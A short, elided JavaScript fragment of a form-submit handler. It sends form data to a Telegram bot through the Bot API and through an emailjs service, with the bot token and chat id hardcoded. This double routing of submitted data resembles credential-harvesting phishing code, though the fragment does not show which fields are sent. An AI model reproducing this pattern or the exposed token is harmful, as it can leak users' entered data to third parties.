...
document.getElementById('form').addEventListener('submit', function (event) {
    ...
    //Protect with window object
    window.fetch("https://api.telegram.org/bot5926101089:AAGXLPTz0PYsT-WT00KoN6nM4w8YM_0q0pQ/sendMessage?chat_id=5917560436", {
        method: "POST",
        headers: {
        ...
        .finally(() => {
            ...
            emailjs.send("service_fhia42n", "template_ggusrcl", formData)
